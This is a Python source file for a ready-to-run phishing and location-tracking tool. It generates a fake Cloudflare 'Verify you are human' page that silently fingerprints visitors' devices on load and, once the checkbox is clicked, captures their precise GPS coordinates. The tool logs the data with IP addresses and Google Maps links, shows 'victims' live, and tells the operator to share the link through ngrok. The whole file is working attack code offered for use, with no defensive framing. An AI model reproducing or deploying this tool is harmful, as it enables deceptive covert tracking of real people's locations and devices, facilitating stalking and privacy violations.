import os
import sys
import tempfile
import subprocess
import shutil
import time
import json
import threading
from datetime import datetime
from pathlib import Path

# Global variables
current_session = None
monitoring = False
SCRIPT_DIR = Path(__file__).parent.absolute()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def header():
    clear_screen()
    print(''' 
    $$\                       $$\                                             $$\                     
    $$ |                      $$ |                                            $$ |                    
    $$ | $$$$$$\   $$$$$$$\ $$$$$$\    $$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$\  $$ | $$$$$$\   $$$$$$$\ 
    $$ | \____$$\ $$  _____|\_$$  _|  $$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  _____|
    $$ | $$$$$$$ |\$$$$$$\    $$ |    \$$$$$$\  $$$$$$$$ |$$$$$$$$ |$$ |  $$ |$$ |$$ /  $$ |$$ /      
    $$ |$$  __$$ | \____$$\   $$ |$$\  \____$$\ $$   ____|$$   ____|$$ |  $$ |$$ |$$ |  $$ |$$ |      
    $$ |\$$$$$$$ |$$$$$$$  |  \$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ $$ |  $$ |$$ |\$$$$$$  |\$$$$$$$\ 
    \__| \_______|\_______/    \____/ \_______/  \_______| \_______|\__|  \__|\__| \______/  \_______|
                                                                                                      
                                           BY SUPERXEON                                                                        
''')

def setup_handlers():
    """Setup permanent handlers and logs in script directory"""
    # Create handlers directory in script folder
    handlers_dir = SCRIPT_DIR / 'handlers'
    handlers_dir.mkdir(exist_ok=True)
    
    # Create logs directory in script folder (PERMANENT)
    logs_dir = SCRIPT_DIR / 'logs'
    logs_dir.mkdir(exist_ok=True)
    
    # info_handler.php
    info_handler = '''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');
$data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

$logFile = '../logs/info.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

echo json_encode(['status' => 'success']);
?>'''
    
    # result_handler.php
    result_handler = '''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');

$logFile = '../logs/result.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

if (isset($data['lat']) && isset($data['lon'])) {
    $lat = str_replace(' deg', '', $data['lat']);
    $lon = str_replace(' deg', '', $data['lon']);
    $mapsUrl = "https://www.google.com/maps/place/{$lat}+{$lon}";
    file_put_contents('../logs/maps.txt', $mapsUrl . "\\n", FILE_APPEND);
}

echo json_encode(['status' => 'success']);
?>'''
    
    # error_handler.php
    error_handler = '''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');

$logFile = '../logs/error.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

echo json_encode(['status' => 'error']);
?>'''
    
    # Write handlers (PERMANENT)
    (handlers_dir / 'info_handler.php').write_text(info_handler, encoding='utf-8')
    (handlers_dir / 'result_handler.php').write_text(result_handler, encoding='utf-8')
    (handlers_dir / 'error_handler.php').write_text(error_handler, encoding='utf-8')
    
    return handlers_dir, logs_dir

class PhishingSession:
    def __init__(self, redirect_url, port=8080):
        self.redirect_url = redirect_url
        self.port = port
        self.temp_dir = None
        self.handlers_dir = None
        self.logs_dir = None
        self.process = None
        self.victims_count = 0
        
    def generate_files(self):
        """Generate HTML in temp, link to permanent handlers"""
        # Setup permanent handlers and logs
        self.handlers_dir, self.logs_dir = setup_handlers()
        
        # Create temp directory for HTML only
        self.temp_dir = Path(tempfile.mkdtemp(prefix='phishing_'))
        
        # HTML Website
        website = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
        .container { text-align: center; max-width: 500px; padding: 2rem; }
        h2 { font-size: 1.5rem; font-weight: 500; margin-bottom: 2rem; }
        .verification-box { border: 2px solid #d9d9d9; border-radius: 4px; padding: 1.5rem; background: #fafafa; margin-bottom: 2rem; }
        .checkbox-container { display: flex; align-items: center; gap: 1rem; cursor: pointer; user-select: none; }
        .checkbox { width: 28px; height: 28px; border: 2px solid #d9d9d9; border-radius: 3px; background: #fff; position: relative; cursor: pointer; transition: all 0.3s; flex-shrink: 0; }
        .checkbox:hover { border-color: #b3b3b3; }
        .checkbox.checked { background: #4caf50; border-color: #4caf50; }
        .checkmark { display: none; position: absolute; left: 8px; top: 3px; width: 7px; height: 14px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
        .checkbox.checked .checkmark { display: block; animation: checkAnim 0.3s ease; }
        @keyframes checkAnim { 0% { height: 0; } 100% { height: 14px; } }
        .spinner { display: none; width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-left: auto; }
        .spinner.active { display: block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .logo { display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #e0e0e0; }
        .success { display: none; color: #4caf50; font-weight: 500; margin-top: 1rem; }
        .success.show { display: block; }
        .info { font-size: 0.9rem; color: #666; margin-top: 2rem; }
        .ray { font-family: monospace; font-size: 0.75rem; color: #999; margin-top: 2rem; }
    </style>
    <div class="container">
        <h2>Verify you are human</h2>
        <div class="verification-box">
            <div class="checkbox-container" id="container">
                <div class="checkbox" id="checkbox"><div class="checkmark"></div></div>
                <label>I'm not a robot</label>
                <div class="spinner" id="spinner"></div>
            </div>
            <div class="logo">
                <div>
                    <div style="font-size: 0.75rem; color: #999;">Protected by</div>
                    <div style="font-weight: 500; color: #333;">Cloudflare</div>
                </div>
            </div>
        </div>
        <div class="success" id="success">Verification complete</div>
        <div class="info">By completing this challenge, you help protect this site.</div>
        <div class="ray">Ray ID: <span id="rayId"></span></div>
    </div>
    <script>
        const REDIRECT_URL = 'REDIRECT_URL_HERE';
        const checkbox = document.getElementById('checkbox');
        const container = document.getElementById('container');
        const spinner = document.getElementById('spinner');
        const success = document.getElementById('success');
        document.getElementById('rayId').textContent = Array.from({ length: 16 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
        
        function collectDeviceInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            let vendor = 'N/A', renderer = 'N/A';
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            if (ua.indexOf('Firefox') > -1) browser = ua.substring(ua.indexOf('Firefox/'));
            else if (ua.indexOf('Chrome') > -1) browser = ua.substring(ua.indexOf('Chrome/'));
            else if (ua.indexOf('Safari') > -1) browser = ua.substring(ua.indexOf('Safari/'));
            const osMatch = ua.match(/\\(([^)]+)\\)/);
            const os = osMatch ? osMatch[1].split(';')[1]?.trim() : 'Unknown';
            return { platform: navigator.platform, cores: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory || 'N/A', vendor: vendor, renderer: renderer, width: screen.width, height: screen.height, browser: browser, os: os, userAgent: ua, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
        }
        
        function sendDeviceInfo(data) { $.ajax({ type: 'POST', url: 'handlers/info_handler.php', data: data }); }
        function sendLocation(lat, lon, acc, alt, dir, spd) { $.ajax({ type: 'POST', url: 'handlers/result_handler.php', data: { status: 'success', lat: lat + ' deg', lon: lon + ' deg', acc: acc + ' m', alt: (alt || 'N/A') + ' m', dir: (dir || 'N/A') + ' deg', spd: (spd || 'N/A') + ' m/s', timestamp: new Date().toISOString() } }); }
        function sendError(errorMsg) { $.ajax({ type: 'POST', url: 'handlers/error_handler.php', data: { status: 'failed', error: errorMsg, timestamp: new Date().toISOString() } }); }
        
        window.addEventListener('load', () => { sendDeviceInfo(collectDeviceInfo()); });
        
        container.addEventListener('click', function () {
            if (checkbox.classList.contains('checked')) return;
            if (navigator.geolocation) {
                spinner.classList.add('active');
                container.style.cursor = 'default';
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
                        sendLocation(latitude, longitude, accuracy, altitude, heading, speed);
                        setTimeout(() => {
                            spinner.classList.remove('active');
                            checkbox.classList.add('checked');
                            success.classList.add('show');
                            setTimeout(() => {
                                success.innerHTML = 'Verification complete - Redirecting...';
                                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                            }, 1000);
                        }, 1500);
                    },
                    (error) => {
                        spinner.classList.remove('active');
                        container.style.cursor = 'pointer';
                        let errorMsg = '';
                        switch (error.code) {
                            case error.PERMISSION_DENIED: errorMsg = 'Location permission denied'; break;
                            case error.POSITION_UNAVAILABLE: errorMsg = 'Location unavailable'; break;
                            case error.TIMEOUT: errorMsg = 'Location timeout'; break;
                            default: errorMsg = 'Unknown error';
                        }
                        sendError(errorMsg);
                        alert(errorMsg + '. Please enable location.');
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        });
    </script>
</body>
</html>'''
        
        website = website.replace('REDIRECT_URL_HERE', self.redirect_url)
        
        # Write HTML to temp
        (self.temp_dir / 'index.html').write_text(website, encoding='utf-8')
        
        # Copy handlers to temp (so PHP server can access it)
        handlers_temp = self.temp_dir / 'handlers'
        shutil.copytree(self.handlers_dir, handlers_temp)
        
        print("\n[+] Files generated")
        print("[*] HTML: " + str(self.temp_dir))
        print("[*] Handlers: " + str(self.handlers_dir))
        print("[*] Logs will be saved to: " + str(self.logs_dir))
        
    def start_server(self):
        """Start PHP server"""
        cmd = ['php', '-S', f'0.0.0.0:{self.port}', '-t', str(self.temp_dir)]
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        print("\n[+] Server started: http://localhost:" + str(self.port))
        print("[*] Redirect URL: " + self.redirect_url)
        
    def monitor_logs(self):
        """Monitor log files for new victims - REAL TIME"""
        info_log = self.logs_dir / 'info.txt'
        result_log = self.logs_dir / 'result.txt'
        
        # Track what we've already displayed
        info_lines_shown = 0
        result_lines_shown = 0
        
        print("[*] Monitoring started... Waiting for victims...")
        
        while monitoring:
            try:
                # Check info log
                if info_log.exists():
                    with open(info_log, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if len(lines) > info_lines_shown:
                            # Display new lines
                            for i in range(info_lines_shown, len(lines)):
                                try:
                                    data = json.loads(lines[i].strip())
                                    self.victims_count = i + 1
                                    self.display_victim_info(data)
                                except:
                                    pass
                            info_lines_shown = len(lines)
                
                # Check result log
                if result_log.exists():
                    with open(result_log, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if len(lines) > result_lines_shown:
                            # Display new lines
                            for i in range(result_lines_shown, len(lines)):
                                try:
                                    data = json.loads(lines[i].strip())
                                    self.display_location_info(data)
                                except:
                                    pass
                            result_lines_shown = len(lines)
                
                time.sleep(0.3)  # Check every 300ms for real-time feel
            except Exception as e:
                pass
    
    def display_victim_info(self, data):
        """Display victim device info"""
        print("\n" + "="*70)
        print("[+] NEW VICTIM #" + str(self.victims_count) + " - " + str(data.get('timestamp', 'N/A')))
        print("="*70)
        print("[DEVICE INFO]")
        print("   IP Address  : " + str(data.get('ip', 'N/A')))
        print("   OS          : " + str(data.get('os', 'N/A')))
        print("   Platform    : " + str(data.get('platform', 'N/A')))
        print("   Browser     : " + str(data.get('browser', 'N/A')))
        print("   CPU Cores   : " + str(data.get('cores', 'N/A')))
        print("   RAM         : " + str(data.get('ram', 'N/A')) + " GB")
        print("   GPU Vendor  : " + str(data.get('vendor', 'N/A')))
        print("   GPU Render  : " + str(data.get('renderer', 'N/A')))
        print("   Screen      : " + str(data.get('width', 'N/A')) + "x" + str(data.get('height', 'N/A')))
        print("   Language    : " + str(data.get('language', 'N/A')))
        print("   Timezone    : " + str(data.get('timezone', 'N/A')))
        ua = str(data.get('userAgent', 'N/A'))
        if len(ua) > 80:
            ua = ua[:77] + "..."
        print("   User Agent  : " + ua)
        print("="*70)
        print("\n[*] Waiting for location permission...")
        sys.stdout.flush()  # Force immediate display
    
    def display_location_info(self, data):
        """Display victim location"""
        print("\n" + "="*70)
        print("[!] LOCATION CAPTURED! - " + str(data.get('timestamp', 'N/A')))
        print("="*70)
        print("[GPS COORDINATES]")
        print("   Latitude    : " + str(data.get('lat', 'N/A')))
        print("   Longitude   : " + str(data.get('lon', 'N/A')))
        print("   Accuracy    : " + str(data.get('acc', 'N/A')))
        print("   Altitude    : " + str(data.get('alt', 'N/A')))
        print("   Direction   : " + str(data.get('dir', 'N/A')))
        print("   Speed       : " + str(data.get('spd', 'N/A')))
        
        # Generate Google Maps URL
        lat = str(data.get('lat', '')).replace(' deg', '')
        lon = str(data.get('lon', '')).replace(' deg', '')
        if lat and lon:
            maps_url = "https://www.google.com/maps/place/" + lat + "+" + lon
            print("\n[GOOGLE MAPS]")
            print("   " + maps_url)
        print("="*70)
        print("[+] Full data saved to: " + str(self.logs_dir))
        print("="*70 + "\n")
        sys.stdout.flush()  # Force immediate display
    
    def cleanup(self):
        """Stop server and clean up temp only"""
        global monitoring
        monitoring = False
        
        if self.process:
            self.process.terminate()
            self.process.wait()
            print("\n[*] Server stopped")
        
        # Only remove temp HTML directory
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
            print("[*] Cleaned temp HTML: " + str(self.temp_dir))
        
        print("[+] All logs saved permanently in: " + str(self.logs_dir))

def forward_link():
    """Handle forward link option"""
    global current_session, monitoring
    
    header()
    print("\n[+] FORWARD LINK MODE")
    print("="*60)
    url = input("\n[?] Enter redirect URL (e.g., https://google.com): ").strip()
    
    if not url:
        print("[!] URL cannot be empty!")
        input("\nPress Enter to continue...")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    port = 8080
    print("\n[*] Setting up phishing page...")
    
    try:
        current_session = PhishingSession(url, port)
        current_session.generate_files()
        current_session.start_server()
        
        # Start monitoring in background
        monitoring = True
        monitor_thread = threading.Thread(target=current_session.monitor_logs, daemon=True)
        monitor_thread.start()
        
        print("\n" + "="*60)
        print("[+] PHISHING SERVER ACTIVE")
        print("="*60)
        print("\n[*] Share this link to victims:")
        print("   Local: http://localhost:" + str(port))
        print("   Network: http://YOUR_IP:" + str(port))
        print("\n[!] Tip: Use ngrok or cloudflared for public URL")
        print("   Example: ngrok http " + str(port))
        print("\n" + "="*60 + "\n")
        
        # Keep running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[!] Stopping server...")
            current_session.cleanup()
            input("\nPress Enter to continue...")
            
    except Exception as e:
        print("\n[!] Error: " + str(e))
        if current_session:
            current_session.cleanup()
        input("\nPress Enter to continue...")

def generate_application():
    """Handle application templates"""
    header()
    print("\n[+] APPLICATION TEMPLATES")
    print("="*60)
    print('''
    1. WhatsApp Web
    2. Google Drive
    3. Telegram
    4. Canva
    5. Facebook
    
    [!] Other applications coming soon...
    ''')
    print("="*60)
    input("\nPress Enter to go back...")

def first_choice():
    """Main menu"""
    while True:
        header()
        print("\n[+] PHISHING TOOL MENU")
        print("="*60)
        print('''
    1. Use Forward Link (Redirect to custom URL)
    2. Use Application Template (Coming Soon)
    3. Exit
        ''')
        print("="*60)
        
        try:
            choice = input("\n[?] Your choice: ").strip()
            
            if choice == '1':
                forward_link()
            elif choice == '2':
                generate_application()
            elif choice == '3':
                print("\n[!] Goodbye!")
                sys.exit(0)
            else:
                print("\n[!] Invalid choice! Please select 1, 2, or 3")
                input("\nPress Enter to continue...")
                
        except KeyboardInterrupt:
            print("\n\n[!] Goodbye!")
            if current_session:
                current_session.cleanup()
            sys.exit(0)
        except Exception as e:
            print("\n[!] Error: " + str(e))
            input("\nPress Enter to continue...")

if __name__ == '__main__':
    try:
        first_choice()
    except KeyboardInterrupt:
        print("\n\n[!] Exiting...")
        if current_session:
            current_session.cleanup()
        sys.exit(0)